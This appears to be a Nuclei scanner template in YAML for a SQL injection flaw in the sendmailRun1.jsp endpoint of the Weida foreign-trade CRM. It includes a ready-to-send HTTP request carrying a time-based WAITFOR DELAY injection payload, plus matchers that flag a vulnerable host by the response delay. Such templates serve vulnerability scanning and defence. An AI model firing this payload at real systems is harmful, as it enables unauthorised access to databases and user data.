id: weidasoft-crm-sendmailRun1-sqli
info:
  name: 维达外贸客户关系管理系统 sendmailRun1.jsp SQL注入漏洞
  author: leadlife
  severity: high
  description: 维达外贸客户关系管理系统 sendmailRun1接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference: 
    - https://www.yuque.com/lvguo-pibd8/fqbwsx/bnolgtqzsinigggp
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    tips:
    repair:
    sqlmap:
    version:
  tags: sqli,weidasoft

http:
  - raw:  
      - |
        @timeout: 15s
        GET /wap/common/sendmailRun1.jsp?commonid=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--%2B HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
        Accept-Language: en-US,en;q=0.5
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - duration >= 5 && duration < 9
        condition: and